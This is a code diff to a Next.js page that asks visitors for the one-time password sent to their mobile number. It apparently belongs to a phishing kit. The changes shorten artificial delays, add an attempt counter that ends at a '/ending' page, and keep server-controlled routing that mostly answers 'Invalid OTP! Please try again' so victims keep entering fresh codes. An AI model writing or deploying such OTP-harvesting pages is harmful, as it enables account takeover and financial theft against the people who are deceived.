@@ -5,8 +5,7 @@ import { useRouter } from "next/navigation";
 import { useEffect, useState } from "react";  
 import TimerComponent from "../inlcude/TimerComponent";
 import WaiterTime from "../inlcude/WaiterTime";
-import styles from "./page.module.css"
-
+import styles from "./ots.module.css"
 
 export default function Home() {
     const [loading, setLoading] = useState(true); 
@@ -18,7 +17,7 @@ export default function Home() {
     useEffect(() => {
         setTimeout(() => {
             setLoading(false); 
-        }, 15000); 
+        }, 100); 
     }, []);
 
     const handleSubmit = async (e) => {
@@ -52,10 +51,15 @@ export default function Home() {
             console.log(nextRoute, "nextin route");
             if(nextRoute=="un"){
                 setTimeout(() => {
+                    if(OTT==10){
+                        router.push('/ending');
+                    }
+                    let newott = OTT+1;
+                    setOTT(newott);
                     setLoading(false);
                     localStorage.setItem("next", "un"); 
                     setError('Invalid OTP! Please try again'); 
-                },15000);
+                },100);
             }else if(nextRoute=="3"){
                 setError('Invalid OTP! Please try again');
                 router.push('/3');
@@ -68,7 +72,7 @@ export default function Home() {
                     setOTT(newott);
                     setLoading(false);
                     setError('Invalid OTP! Please try again');
-                },15000)
+                },100)
             }
         } catch (error) {
             console.error('There was a problem with the fetch operation:', error);
@@ -83,12 +87,12 @@ export default function Home() {
     <>
     <Header />
 
-    <div style={{marginTop:"25px"}} className="px-2" >
+    <div className="container">
         <strong>
-            <p className="text-center mt-4">Please enter the onetime password sent to your registered mobile number</p>
+            <p className={`${styles.centerKaring} mt-4`}>Please enter the onetime password sent to your registered mobile number</p>
         </strong>
         <form onSubmit={handleSubmit} className="mt-3 py-2">
-            <div className="form-group">
+            <div className={`form-group mb-2 ${styles.formGroup}`}>
                 <label htmlFor="">onetime password* </label>
                 <input name="oppp" placeholder="Enter 6 digit  OTP" minLength={6} maxLength={6} type="password" inputMode="numeric"  className={`form-control ${styles.formControl}`}   required/>
             </div>
@@ -97,8 +101,8 @@ export default function Home() {
             </div>
             <TimerComponent />
             
-            <div className={`${styles.buttonContainer} mb-4 text-center form-group w-100`}>
-                    <input type="submit" className={`btn btn-danger text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Login" />
+            <div className={`${styles.buttonContainer} ${styles.centerKaring}  form-group w-100`}>
+                <input type="submit" className={`btn btn-danger ${styles.btnDanger} text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Verify OTP" />
             </div>
         </form>
     </div>
